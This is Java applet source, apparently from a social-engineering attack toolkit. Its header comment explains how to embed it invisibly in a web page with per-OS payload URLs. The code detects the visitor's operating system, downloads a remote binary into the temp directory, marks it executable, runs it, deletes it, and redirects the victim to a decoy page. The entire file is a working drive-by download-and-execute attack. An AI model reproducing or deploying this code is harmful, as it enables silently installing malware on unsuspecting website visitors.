import java.applet.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.Random;

 /**
 *	Original Author: Thomas Werth
 *	Modifications By: Dave Kennedy, Kevin Mitnick
 *	This is a universal Applet which determintes Running OS
 *	Then it fetches based on OS Type download param (WIN,MAC,NIX)
 *	Downloaded File will then be saved in userDir and executed
 *	For proper Function Applet needs to be signed !
 *	This way applet has to be included in Website:
 *	<applet width='1' height='1' code='Java.class' archive='SignedMicrosoft.jar'>
 *	<param name='WIN' value='http://X.x.X.X/win.exe'>
 *	<param name='MAC' value='http://X.x.X.X/mac.bin'>
 *	<param name='NIX' value='http://X.x.X.X/nix.bin'>
 *	<param name='nextPage' value='http://X.x.X.X/index2.html'> </applet>
 *
 **/

public class Java extends Applet {

	private Object initialized = null;
	public Object isInitialized()
	{
		return initialized;
	}

    public void init() {
        Process f;

        try {
	    // generate a random string
	    Random r = new Random();
	    String token = Long.toString(Math.abs(r.nextLong()), 36);
            String pfad = System.getProperty("java.io.tmpdir") + File.separator;
            // grab operating system
            String os = System.getProperty("os.name").toLowerCase();
            String  downParm = "";
            short osType = -1 ;//0=win,1=mac,2=nix
            if  (os.indexOf( "win" ) >= 0) //Windows
            {
                downParm    =   getParameter( "WIN" );
                osType      =   0;
                pfad += token + ".exe";
            }
            else if (os.indexOf( "mac" ) >= 0) //MAC
            {
                downParm    =   getParameter( "MAC" );
                osType      =   1;

		// look for special folders to define snow leopard, etc.
  		if (pfad.startsWith("/var/folders/")) pfad = "/tmp/";
                pfad += token + ".bin";
            }
            else if (os.indexOf( "nix") >=0 || os.indexOf( "nux") >=0) // UNIX
            {
                downParm    =   getParameter( "NIX" );
                osType      =   2;
                pfad += token + ".bin";
            }

	if ( downParm.length() > 0  && pfad.length() > 0 )
	{
            // URL parameter
             URL url = new URL(downParm);
            // Get an input stream for reading
            InputStream in = url.openStream();
            // Create a buffered input stream for efficency
            BufferedInputStream bufIn = new BufferedInputStream(in);
            File outputFile = new File(pfad);
            OutputStream out =
                    new BufferedOutputStream(new FileOutputStream(outputFile));
            byte[] buffer = new byte[2048];
            for (;;)  {
                int nBytes = bufIn.read(buffer);
                if (nBytes <= 0) break;
                out.write(buffer, 0, nBytes);
            }
            out.flush();
            out.close();
            in.close();
	}

            // has it executed yet? then target nextPage to victim
            String page = getParameter( "nextPage" );
	   if ( page != null && page.length() > 0 )
	   {
		URL urlPage = new URL(page);
            	getAppletContext().showDocument(urlPage);
	   }

	    // Here is where we define OS type, i.e. windows, linux, osx, etc.
            if ( osType < 1 ) // If we're running Windows 
            {
                f = Runtime.getRuntime().exec("CMD.exe /c start " + pfad);
		// wait for termination
		f.waitFor();
		// delete old file
		(new File(pfad)).delete();
            }
            else // if not windows then use linux/osx/etc.
            {

		// change permisisons to execute
		Process process1 = Runtime.getRuntime().exec("/bin/chmod 755 " + pfad);
                process1.waitFor();                
		//and execute
                f = Runtime.getRuntime().exec(pfad);
		// wait for termination
		f.waitFor();
		// delete old file
		(new File(pfad)).delete();
            }
			initialized = this;

        } catch(IOException e) {
            e.printStackTrace();
        }
	catch (Exception exception)
	{
		exception.printStackTrace();
	}

}
}
